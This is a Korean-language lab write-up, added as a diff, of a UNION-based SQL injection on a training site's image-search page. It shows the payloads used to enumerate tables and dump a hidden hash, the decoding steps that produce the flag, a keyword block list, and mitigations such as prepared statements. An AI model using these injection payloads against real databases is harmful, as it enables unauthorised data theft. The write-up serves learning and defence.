@@ -1,0 +1,55 @@
+[UNION Based SQL injection]
+
+이 기법은 개발자가 의도한 SQL query를 False로 만들고, 공격자가 의도한 Union SQL query를 활성화시키는 방법이다.
+이는 게시판 목록이 있는 웹 서비스에서 사용하기 쉽다.
+
+@ http://<ip-address>:80/?page=searchimg
+
+# 숫자 넣어서 컬럼 개수 알아내기
+
+105 OR 1=1 하니까 컬럼 두 개가 나와서 컬림이 두 개인 것을 알았다.
+105는 where id = 105를 만족시키기 위해 집어 넣은 랜덤 숫자다.
+
+ex)
+SELECT title, url from users where id = input
+input = "105 OR 1=1"이라면 
+SELECT title,url from users where id = 105 OR 1=1로
+where id = 105 OR 1=1에서 1=1이 참이라 모든 이미지의 타이틀과 url을 볼 수 있다.
+
+# 컬럼 스키마에서 테이블 명과 컬럼 명 추출
+5 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
+
+list_images table에 id, url, title, comment 커럼 확인.
+
+# hash값 얻는 법
+
+5 UNION SELECT title, comment FROM list_images
+
+ID: 5 UNION SELECT title, comment FROM list_images 
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Url : Hack me ?
+
+decode hash to get a flag
+
+(https://hashes.com/en/decrypt/hash)
+
+encode sha256
+
+(https://emn178.github.io/online-tools/sha256.html)
+
+decode result => albatroz -> albatroz -> sha256(albatroz) -> flag
+
+
+# 대응 방안
+
+1) 입력값 검증
+사용자의 입력이 DB Query에 동적으로 영향을 주는 경우 입력된 값이 개발자가 의도한 값(요효값) 인지 검증합니다.
+
+/*, –, ‘, “, ?, #, (, ), ;, @, =, *, +, union, select, drop, update, from, where, join, substr, user_tables, user_table_columns, information_schema, sysobject, table_schema, declare, dual,…
+
+2) MySQL 에러 메시지 노출 차단
+
+3) Prepared Statement로 input 정제해 악성 query 거르기
+# https://m.blog.naver.com/PostView.nhn?blogId=blogpyh&logNo=220675109307&proxyReferer=https:%2F%2Fwww.google.com%2F
+# prepared statement 최초 1회만 파싱하고 변수에 단순히 inpu만 바인딩하기 때문에 악성 쿼리가 들어와도 기능을 못 한다.
+
